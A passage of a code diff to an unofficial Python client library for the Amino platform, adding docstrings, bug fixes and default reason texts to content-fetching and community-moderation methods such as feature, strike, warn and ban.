         else: return objects.WikiCategory(response.json()).WikiCategory
 
     def get_tipped_users(self, blogId: str = None, wikiId: str = None, quizId: str = None, fileId: str = None, chatId: str = None, start: int = 0, size: int = 25):
+        """
+        Get all users who tipped on your posting.
+
+        Accepting:
+        - blogId: str
+        - wikiId: str
+        - quizId: str
+        - fileId: str
+        - chatId: str
+            - can be only one field
+            - blogId -> quizId -> wikiId -> chatId -> fileId
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `TippedUsersSummary`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if blogId or quizId:
             if quizId is not None: blogId = quizId
             response = self.session.get(f"/x{self.comId}/s/blog/{blogId}/tipping/tipped-users-summary?start={start}&size={size}", headers=self.additional_headers())
         elif wikiId: response = self.session.get(f"/x{self.comId}/s/item/{wikiId}/tipping/tipped-users-summary?start={start}&size={size}", headers=self.additional_headers())
         elif chatId: response = self.session.get(f"/x{self.comId}/s/chat/thread/{chatId}/tipping/tipped-users-summary?start={start}&size={size}", headers=self.additional_headers())
         elif fileId: response = self.session.get(f"/x{self.comId}/s/shared-folder/files/{fileId}/tipping/tipped-users-summary?start={start}&size={size}", headers=self.additional_headers())
         else: raise exceptions.SpecifyType()
@@ -1466,15 +2293,15 @@
         **Parameters**
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Chat List <amino.lib.util.objects.ThreadList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/x{self.comId}/s/chat/thread?type=joined-me&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.ThreadList(response.json()["threadList"]).ThreadList
 
     def get_public_chat_threads(self, type: str = "recommended", start: int = 0, size: int = 25):
@@ -1484,15 +2311,15 @@
         **Parameters**
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Chat List <amino.lib.util.objects.ThreadList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/x{self.comId}/s/chat/thread?type=public-all&filterType={type}&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.ThreadList(response.json()["threadList"]).ThreadList
 
     def get_chat_thread(self, chatId: str):
@@ -1501,15 +2328,15 @@
 
         **Parameters**
             - **chatId** : ID of the Chat.
 
         **Returns**
             - **Success** : :meth:`Chat Object <amino.lib.util.objects.Thread>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/x{self.comId}/s/chat/thread/{chatId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.Thread(response.json()["thread"]).Thread
 
     def get_chat_messages(self, chatId: str, size: int = 25, pageToken: str = None):
@@ -1520,15 +2347,15 @@
             - **chatId** : ID of the Chat.
             - *size* : Size of the list.
             - *pageToken* : Next Page Token.
 
         **Returns**
             - **Success** : :meth:`Message List <amino.lib.util.objects.MessageList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         if pageToken is not None: url = f"/x{self.comId}/s/chat/thread/{chatId}/message?v=2&pagingType=t&pageToken={pageToken}&size={size}"
         else: url = f"/x{self.comId}/s/chat/thread/{chatId}/message?v=2&pagingType=t&size={size}"
 
         response = self.session.get(url, headers=self.additional_headers())
         if response.status_code != 200: 
@@ -1542,22 +2369,37 @@
         **Parameters**
             - **chatId** : ID of the Chat.
             - **message** : ID of the Message.
 
         **Returns**
             - **Success** : :meth:`Message Object <amino.lib.util.objects.Message>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/x{self.comId}/s/chat/thread/{chatId}/message/{messageId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.Message(response.json()["message"]).Message
 
     def get_blog_info(self, blogId: str = None, wikiId: str = None, quizId: str = None, fileId: str = None):
+        """
+        Get all info about posting.
+
+        Accepting:
+        - blogId: str
+        - wikiId: str
+        - quizId: str
+        - fileId: str
+            - can be only one field
+            - blogId -> quizId -> wikiId -> fileId
+
+        Recieving:
+        - object `GetBlogInfo`/`GetWikiInfo`/`SharedFolderFile`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if blogId or quizId:
             if quizId is not None: blogId = quizId
             response = self.session.get(f"/x{self.comId}/s/blog/{blogId}", headers=self.additional_headers())
             if response.status_code != 200: 
                 return exceptions.CheckException(response)
             else: return objects.GetBlogInfo(response.json()).GetBlogInfo
 
@@ -1572,42 +2414,102 @@
             if response.status_code != 200: 
                 return exceptions.CheckException(response)
             else: return objects.SharedFolderFile(response.json()["file"]).SharedFolderFile
 
         else: raise exceptions.SpecifyType()
 
     def get_blog_comments(self, blogId: str = None, wikiId: str = None, quizId: str = None, fileId: str = None, sorting: str = "newest", start: int = 0, size: int = 25):
+        """
+        Get all blog comments.
+
+        Accepting:
+        - blogId: str
+        - wikiId: str
+        - quizId: str
+        - fileId: str
+            - can be only one field
+            - blogId -> quizId -> wikiId -> fileId
+        - sorting: str = "newest"
+            - can be only "newest", "oldest" or "top"/"vote"
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `CommentList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if sorting == "newest": sorting = "newest"
         elif sorting == "oldest": sorting = "oldest"
-        elif sorting == "top": sorting = "vote"
+        elif sorting in ["vote", "top"]: sorting = "vote"
 
         if blogId or quizId:
             if quizId is not None: blogId = quizId
             response = self.session.get(f"/x{self.comId}/s/blog/{blogId}/comment?sort={sorting}&start={start}&size={size}", headers=self.additional_headers())
         elif wikiId: response = self.session.get(f"/x{self.comId}/s/item/{wikiId}/comment?sort={sorting}&start={start}&size={size}", headers=self.additional_headers())
         elif fileId: response = self.session.get(f"/x{self.comId}/s/shared-folder/files/{fileId}/comment?sort={sorting}&start={start}&size={size}", headers=self.additional_headers())
         else: raise exceptions.SpecifyType()
 
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.CommentList(response.json()["commentList"]).CommentList
 
     def get_blog_categories(self, size: int = 25):
+        """
+        Get all possible blog categories.
+
+        Accepting:
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `BlogCategoryList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/blog-category?size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.BlogCategoryList(response.json()["blogCategoryList"]).BlogCategoryList
 
-    def get_blogs_by_category(self, categoryId: str,start: int = 0, size: int = 25):
+    def get_blogs_by_category(self, categoryId: str, start: int = 0, size: int = 25):
+        """
+        Get all possible blogs in category.
+
+        Accepting:
+        - categoryId: str
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `BlogList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/blog-category/{categoryId}/blog-list?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.BlogList(response.json()["blogList"]).BlogList
 
     def get_quiz_rankings(self, quizId: str, start: int = 0, size: int = 25):
+        """
+        Get quiz winners.
+
+        Accepting:
+        - quizId: str
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `QuizRankings`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/blog/{quizId}/quiz/result?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.QuizRankings(response.json()).QuizRankings
 
     def get_wall_comments(self, userId: str, sorting: str, start: int = 0, size: int = 25):
         """
@@ -1619,134 +2521,308 @@
                 - ``newest``, ``oldest``, ``top``
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Comments List <amino.lib.util.objects.CommentList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if sorting == "newest": sorting = "newest"
         elif sorting == "oldest": sorting = "oldest"
         elif sorting == "top": sorting = "vote"
         else: raise exceptions.WrongType(sorting)
 
         response = self.session.get(f"/x{self.comId}/s/user-profile/{userId}/comment?sort={sorting}&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.CommentList(response.json()["commentList"]).CommentList
 
     def get_recent_blogs(self, pageToken: str = None, start: int = 0, size: int = 25):
+        """
+        Get recent blogs.
+
+        Accepting:
+        - pageToken: str
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `RecentBlogs`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if pageToken is not None: url = f"/x{self.comId}/s/feed/blog-all?pagingType=t&pageToken={pageToken}&size={size}"
         else: url = f"/x{self.comId}/s/feed/blog-all?pagingType=t&start={start}&size={size}"
 
         response = self.session.get(url, headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.RecentBlogs(response.json()).RecentBlogs
 
     def get_chat_users(self, chatId: str, start: int = 0, size: int = 25):
+        """
+        Getting users in chat.
+
+        Accepting:
+        - chatId: str
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `UserProfileList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/chat/thread/{chatId}/member?start={start}&size={size}&type=default&cv=1.2", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.UserProfileList(response.json()["memberList"]).UserProfileList
 
     def get_notifications(self, start: int = 0, size: int = 25):
+        """
+        Getting notifications in community.
+
+        Accepting:
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `NotificationList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/notification?pagingType=t&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.NotificationList(response.json()["notificationList"]).NotificationList
 
     def get_notices(self, start: int = 0, size: int = 25):
         """
-        :param start: Start of the List (Start: 0)
-        :param size: Amount of Notices to Show
-        :return: Notices List
+        Getting notices in community.
+
+        Notices are NOT notifications. Its like "you are in read only mode", "you got strike", "you got warning", "somebody wants to promote you to curator/leader/curator".
+
+        Accepting:
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `NoticeList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
         """
         response = self.session.get(f"/x{self.comId}/s/notice?type=usersV2&status=1&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.NoticeList(response.json()["noticeList"]).NoticeList
 
     def get_sticker_pack_info(self, sticker_pack_id: str):
+        """
+        Getting all info about sticker pack.
+
+        Accepting:
+        - sticker_pack_id: str
+
+        Recieving:
+        - object `StickerCollection`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/sticker-collection/{sticker_pack_id}?includeStickers=true", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.StickerCollection(response.json()["stickerCollection"]).StickerCollection
 
     def get_sticker_packs(self):
+        """
+        Getting sticker pack.
+
+        Accepting:
+        - sticker_pack_id: str
+
+        Recieving:
+        - object `StickerCollection`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/sticker-collection?includeStickers=false&type=my-active-collection", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         return objects.StickerCollection(response.json()["stickerCollection"]).StickerCollection
 
     # TODO : Finish this
     def get_store_chat_bubbles(self, start: int = 0, size: int = 25):
+        """
+        Getting all available chat bubbles from store.
+
+        Accepting:
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `dict`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/store/items?sectionGroupId=chat-bubble&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             response = response.json()
             del response["api:message"], response["api:statuscode"], response["api:duration"], response["api:timestamp"]
             return response
 
     # TODO : Finish this
     def get_store_stickers(self, start: int = 0, size: int = 25):
+        """
+        Getting all available stickers from store.
+
+        Accepting:
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `dict`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/store/items?sectionGroupId=sticker&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             response = response.json()
             del response["api:message"], response["api:statuscode"], response["api:duration"], response["api:timestamp"]
             return response
 
     def get_community_stickers(self):
+        """
+        Getting all available stickers in community.
+
+        Recieving:
+        - object `CommunityStickerCollection`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/sticker-collection?type=community-shared", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.CommunityStickerCollection(response.json()).CommunityStickerCollection
 
     def get_sticker_collection(self, collectionId: str):
+        """
+        Getting all available info about sticker pack.
+
+        Accepting:
+        - collectionId: str
+
+        Recieving:
+        - object `StickerCollection`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/sticker-collection/{collectionId}?includeStickers=true", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.StickerCollection(response.json()["stickerCollection"]).StickerCollection
 
     def get_shared_folder_info(self):
+        """
+        Getting all available info about shared folder.
+
+        Recieving:
+        - object `GetSharedFolderInfo`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/shared-folder/stats", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.GetSharedFolderInfo(response.json()["stats"]).GetSharedFolderInfo
 
     def get_shared_folder_files(self, type: str = "latest", start: int = 0, size: int = 25):
+        """
+        Getting all available files in shared folder.
+
+        Accepting:
+        - type: str = "latest"
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `SharedFolderFileList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/shared-folder/files?type={type}&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.SharedFolderFileList(response.json()["fileList"]).SharedFolderFileList
 
     #
     # MODERATION MENU
     #
 
     def moderation_history(self, userId: str = None, blogId: str = None, wikiId: str = None, quizId: str = None, fileId: str = None, size: int = 25):
+        """
+        Getting moderation history of object.
+
+        Accepting:
+        - userId: str = None
+        - blogId: str = None
+        - wikiId: str = None
+        - quizId: str = None
+        - fileId: str = None
+            - can be only one field
+            - userId -> blogId -> quizId -> wikiId -> fileId
+            - if all fields are None, getting all latest operations in "shared" moderation history
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `AdminLogList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
+
         if userId: response = self.session.get(f"/x{self.comId}/s/admin/operation?objectId={userId}&objectType=0&pagingType=t&size={size}", headers=self.additional_headers())
         elif blogId: response = self.session.get(f"/x{self.comId}/s/admin/operation?objectId={blogId}&objectType=1&pagingType=t&size={size}", headers=self.additional_headers())
         elif quizId: response = self.session.get(f"/x{self.comId}/s/admin/operation?objectId={quizId}&objectType=1&pagingType=t&size={size}", headers=self.additional_headers())
         elif wikiId: response = self.session.get(f"/x{self.comId}/s/admin/operation?objectId={wikiId}&objectType=2&pagingType=t&size={size}", headers=self.additional_headers())
         elif fileId: response = self.session.get(f"/x{self.comId}/s/admin/operation?objectId={fileId}&objectType=109&pagingType=t&size={size}", headers=self.additional_headers())
         else: response = self.session.get(f"/x{self.comId}/s/admin/operation?pagingType=t&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.AdminLogList(response.json()["adminLogList"]).AdminLogList
 
     def feature(self, time: int, userId: str = None, chatId: str = None, blogId: str = None, wikiId: str = None):
+        """
+        Feature object.
+
+        Accepting:
+        - time: int
+            - time == 1 is one day (for chats its one hour)
+            - time == 2 is two days (for chats its two hours)
+            - time == 3 is three days (for chats its three hours)
+        - userId: str = None
+        - blogId: str = None
+        - wikiId: str = None
+        - quizId: str = None
+            - can be only one field
+            - userId -> blogId -> wikiId -> fileId
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if chatId:
             if time == 1: time = 3600
-            if time == 1: time = 7200
-            if time == 1: time = 10800
+            if time == 2: time = 7200
+            if time == 3: time = 10800
 
         else:
             if time == 1: time = 86400
             elif time == 2: time = 172800
             elif time == 3: time = 259200
             else: raise exceptions.WrongType(time)
 
@@ -1780,14 +2856,29 @@
 
         else: raise exceptions.SpecifyType()
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.json()
 
     def unfeature(self, userId: str = None, chatId: str = None, blogId: str = None, wikiId: str = None):
+        """
+        Unfeature object.
+
+        Accepting:
+        - userId: str = None
+        - blogId: str = None
+        - wikiId: str = None
+        - quizId: str = None
+            - can be only one field
+            - userId -> blogId -> wikiId -> fileId
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = {
             "adminOpName": 114,
             "adminOpValue": {},
             "timestamp": int(timestamp() * 1000)
         }
 
         if userId:
@@ -1812,17 +2903,34 @@
 
         else: raise exceptions.SpecifyType()
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.json()
 
     def hide(self, userId: str = None, chatId: str = None, blogId: str = None, wikiId: str = None, quizId: str = None, fileId: str = None, reason: str = None):
+        """
+        Hide object.
+
+        Accepting:
+        - userId: str = None
+        - blogId: str = None
+        - wikiId: str = None
+        - quizId: str = None
+        - fileId: str = None
+            - can be only one field
+            - userId -> blogId -> quizId -> wikiId -> fileId
+        - reason: str = None
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = {
             "adminOpNote": {
-                "content": reason
+                "content": reason or "[empty reason]"
             },
             "timestamp": int(timestamp() * 1000)
         }
 
         if userId:
             data["adminOpName"] = 18
             data = dumps(data)
@@ -1860,14 +2968,32 @@
 
         else: raise exceptions.SpecifyType()
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.json()
 
     def unhide(self, userId: str = None, chatId: str = None, blogId: str = None, wikiId: str = None, quizId: str = None, fileId: str = None, reason: str = None):
+        """
+        Unhide object.
+
+        Accepting:
+        - userId: str = None
+        - blogId: str = None
+        - wikiId: str = None
+        - quizId: str = None
+        - fileId: str = None
+            - can be only one field
+            - userId -> blogId -> quizId -> wikiId -> fileId
+        - reason: str = None
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
+        
         data = {
             "adminOpNote": {
                 "content": reason
             },
             "timestamp": int(timestamp() * 1000)
         }
 
@@ -1908,14 +3034,27 @@
 
         else: raise exceptions.SpecifyType()
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.json()
 
     def edit_titles(self, userId: str, titles: list, colors: list):
+        """
+        Edit user's titles.
+
+        Accepting:
+        - userId: str
+        - titles: list
+        - colors: list
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
+        
         tlt = []
         for titles, colors in zip(titles, colors):
             tlt.append({"title": titles, "color": colors})
 
         data = dumps({
             "adminOpName": 207,
             "adminOpValue": {
@@ -1925,20 +3064,65 @@
         })
 
         response = self.session.post(f"/x{self.comId}/s/user-profile/{userId}/admin", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.json()
 
+    def edit_titles_as_dict(self, userId: str, titles: dict):
+        """
+        Edit user's titles.
+        Example:
+
+        `subclient.edit_titles_as_dict(userId, {"toxic": "#00FF00"})`
+
+        Accepting:
+        - userId: str
+        - titles: dict
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
+        
+        tlt = []
+        for title, color in titles.items():
+            tlt.append({"title": title, "color": color})
+
+        data = dumps({
+            "adminOpName": 207,
+            "adminOpValue": {
+                "titles": tlt
+            },
+            "timestamp": int(timestamp() * 1000)
+        })
+
+        response = self.session.post(f"/x{self.comId}/s/user-profile/{userId}/admin", headers=self.additional_headers(data=data), data=data)
+        if response.status_code != 200: 
+            return exceptions.CheckException(response)
+        else: return response.json()
+
     # TODO : List all warning texts
     def warn(self, userId: str, reason: str = None):
+        """
+        Give a warn to user.
+
+        Accepting:
+        - userId: str
+        - reason: str = None
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
+
         data = dumps({
             "uid": userId,
             "title": "Custom",
-            "content": reason,
+            "content": reason or "You recieved this warning because of... something. Admin just used amino.fix.fix library to give you a warning and didn't set a reason.",
             "attachedObject": {
                 "objectId": userId,
                 "objectType": 0
             },
             "penaltyType": 0,
             "adminOpNote": {},
             "noticeType": 7,
@@ -1948,25 +3132,44 @@
         response = self.session.post(f"/x{self.comId}/s/notice", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.json()
 
     # TODO : List all strike texts
     def strike(self, userId: str, time: int, title: str = None, reason: str = None):
-        if time == 1: time = 86400
+        """
+        Give a strike (warn + read only mode) to user.
+
+        Accepting:
+        - userId: str
+        - time: int
+            - time == 1 is 1 hour
+            - time == 2 is 4 hours
+            - time == 3 is 8 hours
+            - time == 4 is 12 hours
+            - time == 5 is 24 hours
+        - title: str = None
+        - reason: str = None
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
+
+        if time == 1: time = 3600
         elif time == 2: time = 10800
         elif time == 3: time = 21600
         elif time == 4: time = 43200
         elif time == 5: time = 86400
         else: raise exceptions.WrongType(time)
 
         data = dumps({
             "uid": userId,
-            "title": title,
-            "content": reason,
+            "title": title or "You got striked by Knife of Justice!",
+            "content": reason or "You got striked by Knife of Justice by this admin! Sadly, there is no reason. Admin thought that amino.fix.fix will forgive this, hehe. :з",
             "attachedObject": {
                 "objectId": userId,
                 "objectType": 0
             },
             "penaltyType": 1,
             "penaltyValue": time,
             "adminOpNote": {},
@@ -1975,91 +3178,215 @@
         })
 
         response = self.session.post(f"/x{self.comId}/s/notice", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.json()
 
-    def ban(self, userId: str, reason: str, banType: int = None):
+    def ban(self, userId: str, reason: str = None, banType: int = None):
+        """
+        Ban user.
+
+        Accepting:
+        - userId: str
+        - reason: str = None
+        - banType: int = None
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({
             "reasonType": banType,
             "note": {
-                "content": reason
+                "content": reason or "No reason provided. (Amino.fix.fix will NOT allow fully empty ban reasons. It's not fair.)"
             },
             "timestamp": int(timestamp() * 1000)
         })
 
         response = self.session.post(f"/x{self.comId}/s/user-profile/{userId}/ban", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.json()
 
     def unban(self, userId: str, reason: str):
+        """
+        Unban user.
+
+        Accepting:
+        - userId: str
+        - reason: str = None
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({
             "note": {
                 "content": reason
             },
             "timestamp": int(timestamp() * 1000)
         })
 
         response = self.session.post(f"/x{self.comId}/s/user-profile/{userId}/unban", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.json()
 
     def reorder_featured_users(self, userIds: list):
+        """
+        Reorder featured users.
+
+        Accepting:
+        - userId: list[str]
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({
             "uidList": userIds,
             "timestamp": int(timestamp() * 1000)
         })
 
         response = self.session.post(f"/x{self.comId}/s/user-profile/featured/reorder", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.json()
 
     def get_hidden_blogs(self, start: int = 0, size: int = 25):
+        """
+        Get hidden blogs.
+
+        Accepting:
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `BlogList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/feed/blog-disabled?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.BlogList(response.json()["blogList"]).BlogList
 
     def get_featured_users(self, start: int = 0, size: int = 25):
+        """
+        Get featured users.
+
+        Accepting:
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `UserProfileCountList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/user-profile?type=featured&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.UserProfileCountList(response.json()).UserProfileCountList
 
     def review_quiz_questions(self, quizId: str):
+        """
+        Review quiz questions.
+
+        Accepting:
+        - quizId: str
+
+        Recieving:
+        - object `QuizQuestionList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/blog/{quizId}?action=review", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.QuizQuestionList(response.json()["blog"]["quizQuestionList"]).QuizQuestionList
 
     def get_recent_quiz(self, start: int = 0, size: int = 25):
+        """
+        Get recent quizes.
+
+        Accepting:
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `BlogList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/blog?type=quizzes-recent&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.BlogList(response.json()["blogList"]).BlogList
 
     def get_trending_quiz(self, start: int = 0, size: int = 25):
+        """
+        Get tranding quizes.
+
+        Accepting:
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `BlogList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/feed/quiz-trending?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.BlogList(response.json()["blogList"]).BlogList
 
     def get_best_quiz(self, start: int = 0, size: int = 25):
+        """
+        Get the best quizes ever.
+
+        Accepting:
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `BlogList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/feed/quiz-best-quizzes?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.BlogList(response.json()["blogList"]).BlogList
 
     def send_action(self, actions: list, blogId: str = None, quizId: str = None, lastAction: bool = False):
-        # Action List
-        # Browsing
+        """
+        Sending action to be in live layer.
+
+        Accepting:
+        - actions: list
+            - can be "Browsing"
+        - blogId: str = None
+        - quizId: str = None
+            - not neccessary
+            - blogId -> quizId
+            - can be only one field
+        - lastAction: bool = False
+            - ??
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
 
         if lastAction is True: t = 306
         else: t = 304
 
         data = {
             "o": {
                 "actions": actions,
@@ -2076,14 +3403,33 @@
             if blogId is not None: data["params"]["blogType"] = 0
             if quizId is not None: data["params"]["blogType"] = 6
 
         return self.send(dumps(data))
 
     # Provided by "spectrum#4691"
     def purchase(self, objectId: str, objectType: int, aminoPlus: bool = True, autoRenew: bool = False):
+        """
+        Purchasing... something... from store...
+
+        You probably want to catch objectIds by yourself using HTTP Toolkit.
+
+        Accepting:
+        - objectId: str
+            - id of object that you wanna buy
+        - objectType: str
+            - type of object that you wanna buy
+        - aminoPlus: bool = True
+            - ???
